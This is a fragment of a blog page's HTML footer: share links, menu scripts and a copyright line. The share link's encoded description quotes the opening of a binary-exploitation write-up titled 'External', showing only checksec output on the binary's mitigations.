href="http://www.tumblr.com/share/link?url=https%3a%2f%2ffernetinjection.github.io%2fposts%2f2021-02-01-external%2f&name=External&description=Recon%20As%20usual%2c%20we%26rsquo%3bll%20start%20off%20by%20taking%20a%20look%20at%20the%20mitigations%20enabled%20in%20the%20binary%3a%0a%24%20checksec%20--file%3d.%2fexternal%20RELRO%20STACK%20CANARY%20NX%20PIE%20RPATH%20RUNPATH%20Symbols%20FORTIFY%20Fortified%20Fortifiable%20FILE%20Partial%20RELRO%20No%20canary%20found%20NX%20enabled%20No%20PIE%20No%20RPATH%20No%20RUNPATH%2081%29%20Symbols%20No%200%203%20.%2fexternal%20Cool%2c%20there%26rsquo%3bs%20no%20PIE%20and%20no%20canary%2c%20that%20will%20simplify%20things%20a%20bit%20in%20case%20we%20find%20a%20buffer%20overflow."><i class="fab fa-tumblr fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2ffernetinjection.github.io%2fposts%2f2021-02-01-external%2f&t=External"><i class="fab fa-hacker-news fa-lg" aria-hidden=true></i></a></li></ul></div><div id=actions-footer><a id=menu class=icon href=# onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden=true></i>Menu</a>
+<a id=toc class=icon href=# onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden=true></i>TOC</a>
+<a id=share class=icon href=# onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden=true></i>share</a>
+<a id=top style=display:none class=icon href=# onclick="$('html, body').animate({scrollTop:0},'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden=true></i>Top</a></div></div></div><footer id=footer><div class=footer-left>Copyright &copy; 2021 fernetInjection</div><div class=footer-right><nav><ul><li><a href=/>Home</a></li><li><a href=/posts>Writings</a></li><li><a href=/tags>Tags</a></li><li><a href=/about>About</a></li></ul></nav></div></footer></div></body><link rel=stylesheet href=/lib/font-awesome/css/all.min.css><script src=/lib/jquery/jquery.min.js></script><script src=/js/main.js></script></html>
